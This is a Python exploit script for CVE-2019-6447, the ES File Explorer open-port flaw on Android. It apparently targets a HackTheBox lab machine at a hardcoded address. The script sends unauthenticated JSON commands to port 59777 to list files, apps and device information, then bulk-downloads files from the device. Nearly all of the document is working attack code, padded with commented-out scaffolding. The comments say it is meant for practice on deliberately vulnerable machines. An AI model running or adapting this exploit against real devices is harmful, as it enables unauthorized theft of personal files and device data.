
import requests
import sys
import os
import argparse
import json
import re

##################################################################################################
#   Python script for retrieving files, apps, and device information from an Android device
#   Android device must be running ES File Server 
#   This script relies on the ES File Server vulnerability (CVE-2019-6447)
#
#   This script is used for penetration testing purposes on deliberately vulnerable machines
#   on sites such as HackTheBox and TryHackMe
#
#   This script is loosely based on the following scripts, cited below:
#   
#
#   
#   https://github.com/fs0c131y/ESFileExplorerOpenPortVuln/blob/master/poc.py
#   
#   and
#   
#
#   https://www.exploit-db.com/exploits/50070
#
#
##################################################################################################



cmd_options = ['listFiles','listPics','listVideos','listAudios','listApps','listAppsSystem','listAppsPhone','listAppsSdcard','listAppsAll','listAppsThumbnail','getDeviceInfo']
get_file_options = ['getFile']

machine_name="Explore_HtB_Android"
recon_filenames = {cmd_name: machine_name + "_" + cmd_name.split('list')[1] + ".txt" for cmd_name in cmd_options if "list" in cmd_name}

post_headers = {"Content-Type": "application/json"}
get_headers = {"Content-Type": "text/plain"}

addr='10.10.10.247'

url='http://'+ addr + ':59777'

total_filelist = []

formatted_json_response = ""
json_obj = dict()

### Python split() to remove square brackets at start and end of string, used for correct formatting so that the string can be parsed by json.loads without error
### Splits string using delimiter [ and takes the element at position 1 (everything after opening square bracket "[")
### And then splits string again using same technique, but this time with element at position 0 because the closing square bracket is trailing the rest of the string
def format_json(json_response):
    formatted_json = json_response.replace("\'", "\"")
    formatted_json = formatted_json.split("[")[1].split("]")[0]
    formatted_json = re.sub(',\s+}', '}', formatted_json)
    formatted_json = "[" + formatted_json +"]" 
    return formatted_json

def fetch_android_file(machine_name, filename):
    req_addr = url + "/" + filename
    ##res = requests.get(url + '/' + filename, headers=post_headers)
    res = requests.get(req_addr, headers=get_headers, verify=False)
    retrieved_file = machine_name + "_" + filename
    print("Retrieved file name: ", retrieved_file, "\n")

    if res.status_code == 200:
        with open(retrieved_file, 'wb') as f:
            f.write(res.content)
        print("File retrieved! Enjoy...")
    else:
        print("Something went wrong. Here's the response status code: ", res.status_code)


def get_all_files(machine_name, file_list):
    for file_elem in file_list:
        filename = file_elem["name"]
        print("Retrieving file:", filename)
        fetch_android_file(machine_name, filename)
        ##if file_elem["type"] == "file":
        ##    filename = file_elem["name"]
        ##    print("file:", filename)
        ##    #fetch_android_file(filename)
        ##else:
        ##    print("Not a valid file")



def setup_options():
    parser = argparse.ArgumentParser(description='Retrieve files from an Android device, exploiting the ES File Explorer vulnerability (CVE-2019-6447)')
    parser.add_argument('-cmd', nargs=1, choices=cmd_options, default=cmd_options[0], help='The command to be executed on the ES File Explorer')
    #parser.add_argument('cmd_get', nargs=1, choices=get_file_options, help='Retrieve individual file or all files on Android device')
    #parser.add_argument('ip', dest='addr', help='IP address of target machine')
    parser.add_argument('-ip', nargs='?', default=addr,  help='IP address of target machine')
    subparsers = parser.add_subparsers()
    parser.add_argument('-getfiles', action="store_true",  help='Option to retrieve file or files from generated list of all files on target device')
    ##subparser_get_file = subparsers.add_parser('-getFile')
    ##file_subparsers = subparser_get_file.add_subparsers()
    ##file_subparser_all = file_subparsers.add_parser("get_all_files")
    ##file_subparser_all.add_argument("A", help="Get all files from list of retrieved files on remote Android device")
    ##file_subparser_all.set_defaults(func=get_all_files)
    ##file_subparser_single = file_subparsers.add_parser("fetch_android_file")
    ##file_subparser_single.add_argument("B", help="Get file at index specified from list of retrieved files on remote Android device")
    ##file_subparser_single.set_defaults(func=fetch_android_file)
    ##subparser_get_file.add_argument('-file', type=int, nargs='?',  help='Index number of file to retrieve from generated list of all files on target device')
    #subparser_get_file.set_defaults(func=get_all_files)
    args = parser.parse_args()
    #get_file_args = subparser_get_file.args()
    #return args, get_file_args
    return parser, args

def basic_command():
    main_parser, args = setup_options()
    #args, get_file_args = setup_options()
    cmd=args.cmd[0]
    #cmd=args.cmd
    ##getfile_cmd=args.file
    getfile_cmd=args.getfiles
    payload_data = '{"command":' + cmd + '}'
    print("args:", args)
    print("cmd:", cmd)
    #print("Get file args:", get_file_args)
    print("Get file args:", getfile_cmd)
    print("Recon filenames: ", recon_filenames, "\n")

    if cmd:
        if cmd == 'listFiles':
            print("listFiles command successfully received")
            res = requests.post(url, headers=post_headers, data=payload_data)
            if res and res.status_code == 200: 
                with open("file_list.txt",'wb') as f:
                    res_text=res.text
                   
                    ### Referencing this StackOverflow article for formatting of sanitized JSON to be passed to JSON parser with json.loads:
                    ###
                    ### https://stackoverflow.com/questions/39491420/python-jsonexpecting-property-name-enclosed-in-double-quotes
                    
                    formatted_json_response = format_json(res_text)
                    json_obj=json.loads(formatted_json_response)
                    
                    print("formatted json response using json.loads: ", json_obj, "\n")
                    
                    formatted_json_bytearray=formatted_json_response.encode("utf-8") 
                    f.write(formatted_json_bytearray)
        else:
            cmd_filename=recon_filenames[cmd]
            print("cmd filename: ", cmd_filename, "\n")
            res = requests.post(url, headers=post_headers, data=payload_data)
            if res and res.status_code == 200: 
                with open(cmd_filename,'wb') as f:
                    res_text=res.text
                    formatted_json_response = format_json(res_text)
                    #json_obj=json.loads(formatted_json_response)
                    #print("formatted json response using json.loads: ", json_obj, "\n")
                    formatted_json_bytearray=formatted_json_response.encode("utf-8") 
                    f.write(formatted_json_bytearray)
                    #f.write(res_text)
                    print("Response content: ", res_text, "\n")

    if getfile_cmd:
        #total_filelist="file_list.txt"
        ##total_filelist=dict(formatted_json_response)
        ##total_filelist=formatted_json_response
        total_filelist=json_obj
        ##with open("file_list.txt", "r") as f:
        ##    lines=f.read.splitlines()
        ##    for line in lines:
                #new_filelist_line=line.strip("\n\n")
        ##        new_filelist_line=line
        ##        print("newfile_list line:", new_filelist_line)
        ##        with open("only_files.txt", "w") as only_f:
        ##            only_f.write(new_filelist_line)
            
            #total_filelist = [line.rstrip() for line in f]
            #with open("only_files.txt", "w") as only_f:
            #    for elem in total_filelist:
            #        only_f.write(elem)
        print("All files and folders on target device: ", total_filelist)
        print("type of total_filelist", type(total_filelist), "\n")
        filelist=[file_elem for file_elem in total_filelist if (file_elem["type"] == "file")]
        print("Filelist: ", filelist)
        file_count = 0
        num_files=len(filelist)
        file_indices={i: "" for i in range(num_files)}
        for file in filelist:
            filename=file["name"]
            print("filename: ", filename, "\n")
            file_indices[file_count] = filename
            file_count+=1
        print("file_indices: ", file_indices)
        file_index_cmd_choices = file_indices.values()

        print("Would you like to get all files or only one from the list?\n Enter A for all files, B for single file.\n")
        
        ##file_subparser = main_parser.add_subparsers()
        ##file_subparser_all = file_subparser.add_parser("get_all_files")
        ##file_subparser_all.add_argument("A", help="Get all files from list of retrieved files on remote Android device")
        ##file_subparser_all.set_defaults(func=get_all_files)
        ##file_subparser_single = file_subparser.add_parser("fetch_android_file")
        ##file_subparser_single.add_argument("B", help="Get file at index specified from list of retrieved files on remote Android device")
        ##file_subparser_single.set_defaults(func=fetch_android_file)
        #file_args = file_subparser.parse_args()
        #file_args=main_parser.parse_args()
        choice = str(input())
        print("Choice: ", choice, "\n")
        #machine_name="Explore_HtB_Android"
        if ((choice == "A") or (choice == "a")):
            print("Okay, hang on while I fetch those files for you.")
            get_all_files(machine_name, filelist)
        elif ((choice == "B") or (choice == "b")):
            print("Which file(s) would you like to retrieve?")
            file_index = int(input())
            print("file index chosen: ", file_index)
            file_chosen = file_indices[file_index]
            print("file chosen: ", file_chosen)
            print("Retrieving file...")
        #    machine_name="Explore_HtB_Android"
        #    fetch_android_file(machine_name, file_chosen)
        else:
            print("I'm sorry, you've entered an invalid choice. Best wishes. Warmest regards.")

        print("parsing test complete")


if __name__ == '__main__':
    basic_command()
